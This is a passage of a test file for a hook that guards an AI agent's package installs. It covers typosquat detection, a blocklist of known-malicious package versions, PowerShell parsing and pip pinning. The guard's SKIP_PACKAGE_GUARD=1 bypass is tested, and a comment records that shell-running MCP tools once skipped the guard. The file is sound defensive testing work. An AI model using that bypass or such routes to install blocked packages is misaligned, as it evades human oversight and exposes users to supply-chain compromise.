/**
 * Package Install Security Guard - Tests (TDD)
 *
 * Tests for package-install-guard.ts, a PreToolUse:Bash hook that intercepts
 * package install commands and blocks dangerous installs.
 *
 * Protects against:
 * - Typosquatting attacks (e.g., 'requets' instead of 'requests')
 * - Known malicious package versions (e.g., litellm 1.82.7/1.82.8)
 * - Suspiciously new packages (<24h = block, <7d = warn)
 *
 * The hook reads PreToolUse JSON from stdin, checks the command, and either
 * allows (exit 0) or blocks (exit 2).
 */

import { describe, it, expect, vi, afterEach } from 'vitest';

// ---------------------------------------------------------------------------
// We test the exported logic functions directly, not via subprocess.
// The main hook entry point reads stdin and calls these functions.
// ---------------------------------------------------------------------------

import {
  isPackageInstallCommand,
  extractPackageNames,
  parseEcosystem,
  checkOverride,
  checkMaliciousPackage,
  checkOsvAdvisory,
  checkPackageAge,
  publishDateFromRegistryJson,
  installSegments,
  stripFdRedirects,
  unpinnedPipPackages,
} from '../package-install-guard.js';

import { checkTyposquat } from '../shared/typosquat-detect.js';

// We also import the malicious packages data to test version blocking
import maliciousPackages from '../shared/malicious-packages.json';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makePayload(command: string, tool = 'Bash'): string {
  return JSON.stringify({
    tool_name: tool,
    tool_input: { command },
    session_id: 'test-session',
  });
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('package-install-guard', () => {
  // =========================================================================
  // Command Detection
  // =========================================================================
  describe('command detection', () => {
    it('detects pip install as package install', () => {
      expect(isPackageInstallCommand('pip install requests')).toBe(true);
    });

    it('detects npm install as package install', () => {
      expect(isPackageInstallCommand('npm install express')).toBe(true);
    });

    it('detects yarn add as package install', () => {
      expect(isPackageInstallCommand('yarn add lodash')).toBe(true);
    });

    it('detects uv add as package install', () => {
      expect(isPackageInstallCommand('uv add fastapi')).toBe(true);
    });

    it('detects uv pip install as package install', () => {
      expect(isPackageInstallCommand('uv pip install httpx')).toBe(true);
    });

    it('detects pnpm add as package install', () => {
      expect(isPackageInstallCommand('pnpm add chalk')).toBe(true);
    });

    it('detects pnpm install with package name as package install', () => {
      expect(isPackageInstallCommand('pnpm install chalk')).toBe(true);
    });

    it('detects cargo add as package install', () => {
      expect(isPackageInstallCommand('cargo add serde')).toBe(true);
    });

    it('detects cargo install as package install', () => {
      expect(isPackageInstallCommand('cargo install ripgrep')).toBe(true);
    });

    it('detects go get as package install', () => {
      expect(isPackageInstallCommand('go get github.com/gin-gonic/gin')).toBe(true);
    });

    it('detects gem install as package install', () => {
      expect(isPackageInstallCommand('gem install rails')).toBe(true);
    });

    it('detects bun add as package install', () => {
      expect(isPackageInstallCommand('bun add zod')).toBe(true);
    });

    it('detects bun install with package name as package install', () => {
      expect(isPackageInstallCommand('bun install zod')).toBe(true);
    });

    it('detects composer require as package install', () => {
      expect(isPackageInstallCommand('composer require laravel/framework')).toBe(true);
    });

    it('detects poetry add as package install', () => {
      expect(isPackageInstallCommand('poetry add django')).toBe(true);
    });

    // Non-install commands -> passthrough
    it('does NOT detect pip list as install', () => {
      expect(isPackageInstallCommand('pip list')).toBe(false);
    });

    it('does NOT detect npm ls as install', () => {
      expect(isPackageInstallCommand('npm ls')).toBe(false);
    });

    it('does NOT detect git status as install', () => {
      expect(isPackageInstallCommand('git status')).toBe(false);
    });

    it('does NOT detect echo hello as install', () => {
      expect(isPackageInstallCommand('echo hello')).toBe(false);
    });

    it('does NOT detect bare npm install (no package) as targeted install', () => {
      // bare `npm install` installs from package.json, not a supply chain risk
      expect(isPackageInstallCommand('npm install')).toBe(false);
    });

    it('does NOT detect bare yarn install as targeted install', () => {
      expect(isPackageInstallCommand('yarn install')).toBe(false);
    });

    it('does NOT detect bare bun install as targeted install', () => {
      expect(isPackageInstallCommand('bun install')).toBe(false);
    });

    it('detects npm install with flags before package name', () => {
      expect(isPackageInstallCommand('npm install --save-dev typescript')).toBe(true);
    });

    it('detects pip install with -r (requirements file) as non-targeted', () => {
      // Installing from requirements.txt is not a single-package risk
      expect(isPackageInstallCommand('pip install -r requirements.txt')).toBe(false);
    });

    it('detects pip install with --upgrade flag', () => {
      expect(isPackageInstallCommand('pip install --upgrade requests')).toBe(true);
    });
  });

  // =========================================================================
  // Ecosystem Detection
  // =========================================================================
  describe('ecosystem detection', () => {
    it('identifies pip as pypi ecosystem', () => {
      expect(parseEcosystem('pip install requests')).toBe('pypi');
    });

    it('identifies uv pip install as pypi ecosystem', () => {
      expect(parseEcosystem('uv pip install httpx')).toBe('pypi');
    });

    it('identifies uv add as pypi ecosystem', () => {
      expect(parseEcosystem('uv add fastapi')).toBe('pypi');
    });

    it('identifies poetry add as pypi ecosystem', () => {
      expect(parseEcosystem('poetry add django')).toBe('pypi');
    });

    it('identifies npm install as npm ecosystem', () => {
      expect(parseEcosystem('npm install express')).toBe('npm');
    });

    it('identifies yarn add as npm ecosystem', () => {
      expect(parseEcosystem('yarn add lodash')).toBe('npm');
    });

    it('identifies pnpm add as npm ecosystem', () => {
      expect(parseEcosystem('pnpm add chalk')).toBe('npm');
    });

    it('identifies bun add as npm ecosystem', () => {
      expect(parseEcosystem('bun add zod')).toBe('npm');
    });

    it('identifies cargo add as cargo ecosystem', () => {
      expect(parseEcosystem('cargo add serde')).toBe('cargo');
    });

    it('identifies go get as go ecosystem', () => {
      expect(parseEcosystem('go get github.com/gin-gonic/gin')).toBe('go');
    });

    it('identifies gem install as gem ecosystem', () => {
      expect(parseEcosystem('gem install rails')).toBe('gem');
    });

    it('identifies composer require as composer ecosystem', () => {
      expect(parseEcosystem('composer require laravel/framework')).toBe('composer');
    });

    it('returns null for non-install commands', () => {
      expect(parseEcosystem('git status')).toBeNull();
    });
  });

  // =========================================================================
  // Package Name Extraction
  // =========================================================================
  describe('package name extraction', () => {
    it('extracts package name from pip install', () => {
      const result = extractPackageNames('pip install requests');
      expect(result).toContainEqual({ name: 'requests', version: undefined });
    });

    it('extracts package name and version from pip install with ==', () => {
      const result = extractPackageNames('pip install litellm==1.82.8');
      expect(result).toContainEqual({ name: 'litellm', version: '1.82.8' });
    });

    it('extracts package name from npm install', () => {
      const result = extractPackageNames('npm install express');
      expect(result).toContainEqual({ name: 'express', version: undefined });
    });

    it('extracts package name and version from npm install with @version', () => {
      const result = extractPackageNames('npm install event-stream@3.3.6');
      expect(result).toContainEqual({ name: 'event-stream', version: '3.3.6' });
    });

    it('extracts multiple packages from pip install', () => {
      const result = extractPackageNames('pip install requests flask django');
      expect(result.length).toBe(3);
      expect(result.map(r => r.name)).toEqual(['requests', 'flask', 'django']);
    });

    it('extracts scoped npm package names', () => {
      const result = extractPackageNames('npm install @types/node');
      expect(result).toContainEqual({ name: '@types/node', version: undefined });
    });

    it('extracts scoped npm package with version', () => {
      const result = extractPackageNames('npm install @types/node@20.0.0');
      expect(result).toContainEqual({ name: '@types/node', version: '20.0.0' });
    });

    it('skips flags when extracting names', () => {
      const result = extractPackageNames('npm install --save-dev typescript');
      expect(result).toContainEqual({ name: 'typescript', version: undefined });
      expect(result.length).toBe(1);
    });

    it('extracts from yarn add', () => {
      const result = extractPackageNames('yarn add lodash');
      expect(result).toContainEqual({ name: 'lodash', version: undefined });
    });

    it('extracts from uv add', () => {
      const result = extractPackageNames('uv add fastapi');
      expect(result).toContainEqual({ name: 'fastapi', version: undefined });
    });

    it('extracts from cargo add', () => {
      const result = extractPackageNames('cargo add serde');
      expect(result).toContainEqual({ name: 'serde', version: undefined });
    });

    it('extracts from composer require with vendor/package', () => {
      const result = extractPackageNames('composer require laravel/framework');
      expect(result).toContainEqual({ name: 'laravel/framework', version: undefined });
    });
  });

  // =========================================================================
  // Typosquat Detection
  // =========================================================================
  describe('typosquat detection', () => {
    it('flags requets as typosquat of requests (pypi)', () => {
      const result = checkTyposquat('requets', 'pypi');
      expect(result.isTyposquat).toBe(true);
      expect(result.similarTo).toBe('requests');
    });

    it('flags exprss as typosquat of express (npm)', () => {
      const result = checkTyposquat('exprss', 'npm');
      expect(result.isTyposquat).toBe(true);
      expect(result.similarTo).toBe('express');
    });

    it('flags litelm as typosquat of litellm (pypi)', () => {
      const result = checkTyposquat('litelm', 'pypi');
      expect(result.isTyposquat).toBe(true);
      expect(result.similarTo).toBe('litellm');
    });

    it('allows requests as legitimate (pypi)', () => {
      const result = checkTyposquat('requests', 'pypi');
      expect(result.isTyposquat).toBe(false);
    });

    it('allows express as legitimate (npm)', () => {
      const result = checkTyposquat('express', 'npm');
      expect(result.isTyposquat).toBe(false);
    });

    it('flags colourama as typosquat of colorama (pypi)', () => {
      const result = checkTyposquat('colourama', 'pypi');
      expect(result.isTyposquat).toBe(true);
      expect(result.similarTo).toBe('colorama');
    });

    it('flags requsts as typosquat of requests (pypi) via Levenshtein', () => {
      const result = checkTyposquat('requsts', 'pypi');
      expect(result.isTyposquat).toBe(true);
      expect(result.similarTo).toBe('requests');
    });

    it('allows a completely unrelated package name', () => {
      const result = checkTyposquat('my-unique-company-package', 'npm');
      expect(result.isTyposquat).toBe(false);
    });

    it('flags djnago as typosquat of django (pypi)', () => {
      const result = checkTyposquat('djnago', 'pypi');
      expect(result.isTyposquat).toBe(true);
      expect(result.similarTo).toBe('django');
    });

    it('flags reakt as typosquat of react (npm)', () => {
      const result = checkTyposquat('reakt', 'npm');
      expect(result.isTyposquat).toBe(true);
      expect(result.similarTo).toBe('react');
    });

    it('flags lodasj as typosquat of lodash (npm)', () => {
      const result = checkTyposquat('lodasj', 'npm');
      expect(result.isTyposquat).toBe(true);
      expect(result.similarTo).toBe('lodash');
    });
  });

  // =========================================================================
  // Malicious Package Detection
  // =========================================================================
  describe('malicious package detection', () => {
    it('has litellm in pypi blocklist', () => {
      expect(maliciousPackages.pypi.litellm).toBeDefined();
      expect(maliciousPackages.pypi.litellm.blocked_versions).toContain('1.82.7');
      expect(maliciousPackages.pypi.litellm.blocked_versions).toContain('1.82.8');
    });

    it('has event-stream in npm blocklist', () => {
      const es = maliciousPackages.npm['event-stream'];
      expect(es).toBeDefined();
      expect(es.blocked_versions).toContain('3.3.6');
    });

    it('has ua-parser-js in npm blocklist', () => {
      const uap = maliciousPackages.npm['ua-parser-js'];
      expect(uap).toBeDefined();
      expect(uap.blocked_versions).toContain('0.7.29');
    });

    it('has colors in npm blocklist', () => {
      const colors = maliciousPackages.npm['colors'];
      expect(colors).toBeDefined();
      expect(colors.blocked_versions).toContain('1.4.1');
    });

    it('has node-ipc in npm blocklist', () => {
      const nodeipc = maliciousPackages.npm['node-ipc'];
      expect(nodeipc).toBeDefined();
      expect(nodeipc.blocked_versions).toContain('10.1.1');
    });

    it('colourama is blocked_all in pypi', () => {
      expect(maliciousPackages.pypi.colourama.blocked_all).toBe(true);
    });
  });

  // =========================================================================
  // checkMaliciousPackage function
  // =========================================================================
  describe('checkMaliciousPackage function', () => {
    it('blocks litellm==1.82.8 as known malicious', () => {
      const result = checkMaliciousPackage('litellm', '1.82.8', 'pypi');
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain('supply chain');
    });

    it('allows litellm==1.83.0 (safe version)', () => {
      const result = checkMaliciousPackage('litellm', '1.83.0', 'pypi');
      expect(result.blocked).toBe(false);
    });

    it('blocks litellm without version (has blocked versions)', () => {
      // When no version specified and package has known-bad versions, warn but allow
      const result = checkMaliciousPackage('litellm', undefined, 'pypi');
      expect(result.blocked).toBe(false);
      expect(result.warning).toBeDefined();
    });

    it('blocks event-stream@3.3.6 as known malicious', () => {
      const result = checkMaliciousPackage('event-stream', '3.3.6', 'npm');
      expect(result.blocked).toBe(true);
    });

    it('allows event-stream@4.0.0 (safe version)', () => {
      const result = checkMaliciousPackage('event-stream', '4.0.0', 'npm');
      expect(result.blocked).toBe(false);
    });

    it('blocks colourama entirely (blocked_all)', () => {
      const result = checkMaliciousPackage('colourama', undefined, 'pypi');
      expect(result.blocked).toBe(true);
    });

    it('allows an unknown package', () => {
      const result = checkMaliciousPackage('some-random-safe-pkg', undefined, 'npm');
      expect(result.blocked).toBe(false);
    });
  });

  // =========================================================================
  // Ecosystems with no blocklist (2026-11-05: harden only). The blocklist JSON holds npm and pypi
  // keys. A cargo, go, gem, composer, nuget or brew name must not be matched against the npm list.
  // =========================================================================
  describe('ecosystems with no blocklist', () => {
    const UNCHECKED = ['cargo', 'go', 'gem', 'composer', 'nuget', 'brew'] as const;

    it('control: zer0code is in the npm blocklist as blocked_all', () => {
      expect((maliciousPackages as any).npm['zer0code']?.blocked_all).toBe(true);
      expect(checkMaliciousPackage('zer0code', undefined, 'npm').blocked).toBe(true);
    });

    it.each(UNCHECKED)('an npm-blocklisted name is not blocked for %s', (eco) => {
      expect(checkMaliciousPackage('zer0code', undefined, eco)).toEqual({ blocked: false });
    });

    it.each(UNCHECKED)('an npm-blocklisted name with a pinned version is not blocked for %s', (eco) => {
      expect(checkMaliciousPackage('event-stream', '3.3.6', eco)).toEqual({ blocked: false });
    });

    it.each(UNCHECKED)('no known-bad-versions warning is produced for %s', (eco) => {
      // event-stream has blocked_versions only: with npm and no version it warns.
      expect(checkMaliciousPackage('event-stream', undefined, 'npm').warning).toBeDefined();
      expect(checkMaliciousPackage('event-stream', undefined, eco).warning).toBeUndefined();
    });

    it('control: an npm-list name is not matched by the pypi list', () => {
      expect(checkMaliciousPackage('zer0code', undefined, 'pypi').blocked).toBe(false);
    });

    it('control: a pypi-list name is not matched by the npm list', () => {
      expect(checkMaliciousPackage('colourama', undefined, 'npm').blocked).toBe(false);
    });

    it('control: a pypi-blocklisted name still blocks for pypi', () => {
      expect(checkMaliciousPackage('colourama', undefined, 'pypi').blocked).toBe(true);
    });
  });

  // checkOsvAdvisory and checkPackageAge already skip other ecosystems. Pin that, and pin that
  // they make no network call: a registry or OSV lookup for a crate would query the wrong index.
  describe('OSV and age checks skip ecosystems with no registry support, with no network call', () => {
    const UNCHECKED = ['cargo', 'go', 'gem', 'composer', 'nuget', 'brew'] as const;

    async function withNetSpy<T>(run: (spies: { request: any; get: any }) => Promise<T>): Promise<T> {
      const https = (await import('node:https')).default;
      const request = vi.spyOn(https, 'request').mockImplementation((() => { throw new Error('test: network call'); }) as any);
      const get = vi.spyOn(https, 'get').mockImplementation((() => { throw new Error('test: network call'); }) as any);
      try {
        return await run({ request, get });
      } finally {
        request.mockRestore();
        get.mockRestore();
      }
    }

    it('control: the spy sees the OSV call for npm', async () => {
      await withNetSpy(async ({ request, get }) => {
        await checkOsvAdvisory('zz-spy-control', '1.0.0', 'npm');
        expect(request.mock.calls.length + get.mock.calls.length).toBeGreaterThan(0);
      });
    });

    it('control: the spy sees the registry call for npm', async () => {
      await withNetSpy(async ({ request, get }) => {
        await checkPackageAge('zz-spy-control', 'npm', '1.0.0');
        expect(request.mock.calls.length + get.mock.calls.length).toBeGreaterThan(0);
      });
    });

    it.each(UNCHECKED)('checkOsvAdvisory for %s is not blocked and makes no network call', async (eco) => {
      await withNetSpy(async ({ request, get }) => {
        expect(await checkOsvAdvisory('serde', '1.0.0', eco)).toEqual({ blocked: false });
        expect(request).not.toHaveBeenCalled();
        expect(get).not.toHaveBeenCalled();
      });
    });

    it.each(UNCHECKED)('checkPackageAge for %s is not blocked and makes no network call', async (eco) => {
      await withNetSpy(async ({ request, get }) => {
        expect(await checkPackageAge('serde', eco, '1.0.0')).toEqual({ ageHours: null, blocked: false });
        expect(request).not.toHaveBeenCalled();
        expect(get).not.toHaveBeenCalled();
      });
    });
  });

  // =========================================================================
  // Override
  // =========================================================================
  describe('override', () => {
    it('allows command with SKIP_PACKAGE_GUARD=1 prefix', () => {
      expect(checkOverride('SKIP_PACKAGE_GUARD=1 pip install requets')).toBe(true);
    });

    it('does not allow command without override prefix', () => {
      expect(checkOverride('pip install requets')).toBe(false);
    });

    it('allows SKIP_PACKAGE_GUARD=1 anywhere in env prefix', () => {
      expect(checkOverride('FOO=bar SKIP_PACKAGE_GUARD=1 npm install evil-pkg')).toBe(true);
    });
  });

  // =========================================================================
  // OSV.dev Advisory Check
  // =========================================================================
  describe('OSV.dev advisory check', () => {
    it('should be exported from the module', () => {
      expect(typeof checkOsvAdvisory).toBe('function');
    });

    it('should return { blocked: false } for cargo ecosystem (unsupported)', async () => {
      const result = await checkOsvAdvisory('serde', undefined, 'cargo');
      expect(result.blocked).toBe(false);
    });

    it('should return { blocked: false } for go ecosystem (unsupported)', async () => {
      const result = await checkOsvAdvisory('github.com/gin-gonic/gin', undefined, 'go');
      expect(result.blocked).toBe(false);
    });

    it('should return { blocked: false } for gem ecosystem (unsupported)', async () => {
      const result = await checkOsvAdvisory('rails', undefined, 'gem');
      expect(result.blocked).toBe(false);
    });

    it('should return { blocked: false } for composer ecosystem (unsupported)', async () => {
      const result = await checkOsvAdvisory('laravel/framework', undefined, 'composer');
      expect(result.blocked).toBe(false);
    });

    it('should accept pypi ecosystem without error', async () => {
      // This calls the real API (fail-open on network errors)
      const result = await checkOsvAdvisory('requests', '2.31.0', 'pypi');
      expect(result).toHaveProperty('blocked');
      expect(typeof result.blocked).toBe('boolean');
    });

    it('should accept npm ecosystem without error', async () => {
      // This calls the real API (fail-open on network errors)
      const result = await checkOsvAdvisory('express', '4.18.2', 'npm');
      expect(result).toHaveProperty('blocked');
      expect(typeof result.blocked).toBe('boolean');
    });

    it('should return OsvResult shape with optional fields', async () => {
      const result = await checkOsvAdvisory('some-nonexistent-pkg-xyz', undefined, 'npm');
      expect(result).toHaveProperty('blocked');
      // warning and advisoryId are optional
      if (result.warning) {
        expect(typeof result.warning).toBe('string');
      }
      if (result.advisoryId) {
        expect(typeof result.advisoryId).toBe('string');
      }
    });
  });

  // =========================================================================
  // 2026-09-01 regressions: legitimate near-misses, pinned-version age check,
  // and the deny envelope shape.
  // =========================================================================
  describe('legitimate near-miss allowlist', () => {
    it.each([
      ['vitest', 'npm'],
      ['vite-node', 'npm'],
      ['chai', 'npm'],
      ['ora', 'npm'],
      ['uid', 'npm'],
      ['zx', 'npm'],
      ['sympy', 'pypi'],
      ['pipx', 'pypi'],
      ['httpie', 'pypi'],
      ['hiredis', 'pypi'],
      ['torchx', 'pypi'],
      ['mcp', 'pypi'],
    ] as const)('does not flag %s (%s) even though it is within 2 edits of a popular name', (name, eco) => {
      expect(checkTyposquat(name, eco).isTyposquat).toBe(false);
    });

    it('still flags real near-miss typosquats', () => {
      expect(checkTyposquat('vitte', 'npm').isTyposquat).toBe(true);
      expect(checkTyposquat('vitest1', 'npm').isTyposquat).toBe(false); // 3 from vite, not in list: fine either way
      expect(checkTyposquat('numpyy', 'pypi').isTyposquat).toBe(true);
    });
  });

  describe('publishDateFromRegistryJson', () => {
    const npmDoc = {
      'dist-tags': { latest: '25.0.0' },
      time: {
        created: '2016-01-01T00:00:00.000Z',
        '24.13.3': '2026-07-08T06:48:03.261Z',
        '25.0.0': '2026-09-01T14:00:00.000Z',
      },
    };
    const pypiDoc = {
      info: { version: '2.0.0' },
      releases: {
        '1.9.0': [{ upload_time_iso_8601: '2026-05-01T00:00:00.000Z' }],
        '2.0.0': [{ upload_time_iso_8601: '2026-09-01T13:00:00.000Z' }],
      },
    };

    it('npm: uses the pinned exact version when the registry knows it', () => {
      expect(publishDateFromRegistryJson(npmDoc, 'npm', '24.13.3')?.toISOString()).toBe('2026-07-08T06:48:03.261Z');
    });
    it('npm: falls back to latest for no version or a range', () => {
      expect(publishDateFromRegistryJson(npmDoc, 'npm')?.toISOString()).toBe('2026-09-01T14:00:00.000Z');
      expect(publishDateFromRegistryJson(npmDoc, 'npm', '^24.13.0')?.toISOString()).toBe('2026-09-01T14:00:00.000Z');
      expect(publishDateFromRegistryJson(npmDoc, 'npm', 'latest')?.toISOString()).toBe('2026-09-01T14:00:00.000Z');
    });
    it('npm: an unknown pinned version falls back to latest rather than passing silently', () => {
      expect(publishDateFromRegistryJson(npmDoc, 'npm', '9.9.9')?.toISOString()).toBe('2026-09-01T14:00:00.000Z');
    });
    it('pypi: same rules', () => {
      expect(publishDateFromRegistryJson(pypiDoc, 'pypi', '1.9.0')?.toISOString()).toBe('2026-05-01T00:00:00.000Z');
      expect(publishDateFromRegistryJson(pypiDoc, 'pypi')?.toISOString()).toBe('2026-09-01T13:00:00.000Z');
    });
    it('pypi: a PEP 440 pre-release pin uses its own date, not the older stable release', () => {
      const doc = {
        info: { version: '1.8.0' },
        releases: {
          '1.8.0': [{ upload_time_iso_8601: '2026-01-01T00:00:00.000Z' }],
          '1.9.0rc1': [{ upload_time_iso_8601: '2026-09-23T10:00:00.000Z' }],
        },
      };
      expect(publishDateFromRegistryJson(doc, 'pypi', '1.9.0rc1')?.toISOString()).toBe('2026-09-23T10:00:00.000Z');
    });
    it('pypi: a shortened pin (1.8) resolves to its PEP 440 equal release (1.8.0), not the fallback', () => {
      const doc = {
        info: { version: '2.0.0' }, // the fallback, with a DIFFERENT date, so the test can tell them apart
        releases: {
          '1.8.0': [{ upload_time_iso_8601: '2026-01-01T00:00:00.000Z' }],
          '2.0.0': [{ upload_time_iso_8601: '2026-09-23T10:00:00.000Z' }],
        },
      };
      expect(publishDateFromRegistryJson(doc, 'pypi', '1.8')?.toISOString()).toBe('2026-01-01T00:00:00.000Z');
      expect(publishDateFromRegistryJson(doc, 'pypi', '1.8.0.0')?.toISOString()).toBe('2026-01-01T00:00:00.000Z');
      expect(publishDateFromRegistryJson(doc, 'pypi', '1.9')?.toISOString()).toBe('2026-09-23T10:00:00.000Z'); // unknown -> fallback
    });
    it('pypi: ages a release by its NEWEST file (a new wheel on an old release)', () => {
      const doc = {
        info: { version: '2.0.0' },
        releases: {
          '2.0.0': [
            { upload_time_iso_8601: '2025-01-01T00:00:00.000Z' }, // sdist
            { upload_time_iso_8601: '2026-09-23T09:00:00.000Z' }, // wheel added later
            { upload_time_iso_8601: 'not-a-date' },
          ],
        },
      };
      expect(publishDateFromRegistryJson(doc, 'pypi', '2.0.0')?.toISOString()).toBe('2026-09-23T09:00:00.000Z');
    });
    it('returns null on malformed documents', () => {
      expect(publishDateFromRegistryJson(null, 'npm')).toBeNull();
      expect(publishDateFromRegistryJson({}, 'pypi')).toBeNull();
    });
    it('extractPackageNames carries a pip == pre-release pin through', () => {
      expect(extractPackageNames('pip install example==1.9.0rc1')).toEqual([{ name: 'example', version: '1.9.0rc1' }]);
    });
    it('extractPackageNames carries the pinned version through to the age check input', () => {
      const pkgs = extractPackageNames('pnpm add -Dw @types/node@24.13.3');
      expect(pkgs).toEqual([{ name: '@types/node', version: '24.13.3' }]);
    });
  });

  // Review H2 (FourthCompanyBrain, 2026-10-04): PowerShell is the default shell here, and the
  // "pin every install" rule was prose only.
  describe('PowerShell forms and later segments', () => {
    it('detects python -m pip install', () => {
      expect(extractPackageNames('python -m pip install requests')).toEqual([{ name: 'requests', version: undefined }]);
    });
    it('detects py -3.12 -m pip install', () => {
      expect(isPackageInstallCommand('py -3.12 -m pip install requests')).toBe(true);
    });
    it('detects a pip.exe under a Windows venv path', () => {
      expect(isPackageInstallCommand('.venv\\Scripts\\pip.exe install requests')).toBe(true);
    });
    it('finds an install after cd in Bash', () => {
      expect(installSegments('cd /tmp/x && pip install requests')).toEqual(['pip install requests']);
    });
    it('finds an install after Set-Location in PowerShell', () => {
      expect(installSegments('Set-Location C:\\x; python -m pip install requests', 'PowerShell')).toEqual(['python -m pip install requests']);
    });
    it('does not treat an echoed install as an install', () => {
      expect(installSegments('echo "pip install requests"')).toEqual([]);
    });
    // Critic round 1 on PR #97.
    it('does not treat a literal heredoc line as an install', () => {
      expect(installSegments("cat > README.md <<'EOF'\npip install requests\nEOF")).toEqual([]);
    });
    it('sees an install after a PowerShell backtick escape inside quotes', () => {
      expect(installSegments('Write-Host "done`n"; pip install requests', 'PowerShell')).toEqual(['pip install requests']);
    });
    it('joins a PowerShell backtick line continuation', () => {
      expect(isPackageInstallCommand(installSegments('python -m pip `\n  install requests', 'PowerShell')[0] ?? '')).toBe(true);
    });
    it('sees pip global options and interpreter flags before install', () => {
      expect(isPackageInstallCommand('pip --disable-pip-version-check install requests')).toBe(true);
      expect(isPackageInstallCommand('python -m pip -q install requests')).toBe(true);
      expect(isPackageInstallCommand('pip --proxy http://p:8080 install requests')).toBe(true);
      expect(isPackageInstallCommand('python -I -m pip install requests')).toBe(true);
      expect(isPackageInstallCommand('python -X utf8 -m pip install requests')).toBe(true);
    });
    it('matches launchers in any letter case', () => {
      expect(isPackageInstallCommand('Python -m pip install requests')).toBe(true);
      expect(isPackageInstallCommand('PIP install requests')).toBe(true);
    });
    it('strips sudo, time and a brace before an install', () => {
      expect(installSegments('sudo pip install requests')).toEqual(['pip install requests']);
      expect(installSegments('{ pip install requests; }')).toEqual(['pip install requests']);
    });
    it('splits a command substitution into its segments', () => {
      expect(installSegments('x=$(cd /tmp && pip install requests)')).toEqual(['pip install requests']);
    });
  });

  describe('pip pin check', () => {
    it('flags a bare name', () => {
      expect(unpinnedPipPackages('pip install requests')).toEqual(['requests']);
    });
    it('flags a range and a wildcard', () => {
      expect(unpinnedPipPackages('pip install "requests>=2" httpx==0.*')).toEqual(['requests', 'httpx']);
    });
    it('passes == and === pins, with extras and quotes', () => {
      expect(unpinnedPipPackages('pip install "requests[socks]==2.32.3" mcp===1.26.0')).toEqual([]);
    });
    it('flags uv pip install and python -m pip install', () => {
      expect(unpinnedPipPackages('uv pip install httpx')).toEqual(['httpx']);
      expect(unpinnedPipPackages('python -m pip install -U pip')).toEqual(['pip']);
    });
    it('leaves lockfile tools, requirement files and local paths alone', () => {
      expect(unpinnedPipPackages('uv add httpx')).toEqual([]);
      expect(unpinnedPipPackages('pip install -r requirements.txt')).toEqual([]);
      expect(unpinnedPipPackages('pip install -e .')).toEqual([]);
      expect(unpinnedPipPackages('pip install .')).toEqual([]);
      expect(unpinnedPipPackages('pip install dist\\pkg-1.0-py3-none-any.whl')).toEqual([]);
    });
    it('leaves npm alone', () => {
      expect(unpinnedPipPackages('npm install express')).toEqual([]);
    });
    // Critic round 1 on PR #97: a flag value is not a package.
    it('skips the value of --trusted-host and --python', () => {
      expect(unpinnedPipPackages('pip install --trusted-host pypi.org requests==2.31.0')).toEqual([]);
      expect(unpinnedPipPackages('uv pip install --python 3.12 httpx==0.27.0')).toEqual([]);
    });
    it('reads a quoted specifier with spaces and a PEP 508 marker', () => {
      expect(unpinnedPipPackages('pip install "requests >= 2"')).toEqual(['requests']);
      expect(unpinnedPipPackages('pip install "requests==2.31.0; python_version>=\'3.8\'"')).toEqual([]);
    });
  });

  describe('deny envelope (built hook, subprocess)', () => {
    /** The built hook runs without VITEST, so its guard log must go to a temp file, never ~/.claude/logs. */
    async function builtHookEnv(): Promise<{ env: NodeJS.ProcessEnv; log: string }> {
      const { mkdtempSync } = await import('node:fs');
      const { tmpdir } = await import('node:os');
      const { join } = await import('node:path');
      const log = join(mkdtempSync(join(tmpdir(), 'pig-guard-log-')), 'guard-decisions.jsonl');
      const env: NodeJS.ProcessEnv = { ...process.env, CCV3_GUARD_DECISIONS_LOG: log };
      delete env.VITEST;
      delete env.VITEST_WORKER_ID;
      return { env, log };
    }

    it('denies an unpinned pip install sent through the PowerShell tool', async () => {
      const { spawnSync } = await import('node:child_process');
      const { existsSync } = await import('node:fs');
      const { fileURLToPath } = await import('node:url');
      const dist = fileURLToPath(new URL('../../dist/package-install-guard.mjs', import.meta.url));
      if (!existsSync(dist)) return;
      const { env } = await builtHookEnv();
      const res = spawnSync(process.execPath, [dist], {
        input: makePayload('Set-Location C:\\x; python -m pip install requests', 'PowerShell'),
        encoding: 'utf8',
        timeout: 20_000,
        env,
      });
      expect(res.status).toBe(0);
      const out = JSON.parse(res.stdout.trim().split('\n').pop()!);
      expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
      expect(out.hookSpecificOutput.permissionDecisionReason).toMatch(/requests==/);
    });

    it('emits the PreToolUse hookSpecificOutput deny envelope on stdout and exits 0', async () => {
      const { spawnSync } = await import('node:child_process');
      const { existsSync } = await import('node:fs');
      const { fileURLToPath } = await import('node:url');
      const dist = fileURLToPath(new URL('../../dist/package-install-guard.mjs', import.meta.url));
      if (!existsSync(dist)) return; // dist not built in this checkout; the build step runs this in CI
      // The hook skips main() when VITEST is set (so importing it in tests is side-effect free);
      // the subprocess must not inherit that or it prints nothing.
      const { env, log } = await builtHookEnv();
      const res = spawnSync(process.execPath, [dist], {
        input: makePayload('pip install requets'),
        encoding: 'utf8',
        timeout: 20_000,
        env,
      });
      expect(res.status).toBe(0);
      const out = JSON.parse(res.stdout.trim().split('\n').pop()!);
      expect(out.hookSpecificOutput.hookEventName).toBe('PreToolUse');
      expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
      expect(out.hookSpecificOutput.permissionDecisionReason).toMatch(/typosquat/i);
      // The deny reaches the guard log named by CCV3_GUARD_DECISIONS_LOG, and only that one.
      const { readFileSync } = await import('node:fs');
      const rows = readFileSync(log, 'utf8').trim().split('\n').map((l) => JSON.parse(l));
      expect(rows).toHaveLength(1);
      expect(rows[0]).toMatchObject({ hook: 'package-install-guard', decision: 'deny', session_id: 'test-session' });
    });
  });
});

// F07 (2026-11-03 Cloudflare paper eval): shell-running MCP tools skipped this guard.
describe('shell-running MCP tools (F07), built hook, subprocess', () => {
  const START = 'mcp__plugin_desktop-commander_desktop-commander__start_process';
  const INTERACT = 'mcp__plugin_desktop-commander_desktop-commander__interact_with_process';

  async function run(payload: object): Promise<Record<string, any>> {
    const { spawnSync } = await import('node:child_process');
    const { existsSync, mkdtempSync } = await import('node:fs');
    const { tmpdir } = await import('node:os');
    const { join } = await import('node:path');
    const { fileURLToPath } = await import('node:url');
    const dist = fileURLToPath(new URL('../../dist/package-install-guard.mjs', import.meta.url));
    expect(existsSync(dist)).toBe(true);
    const env: NodeJS.ProcessEnv = {
      ...process.env,
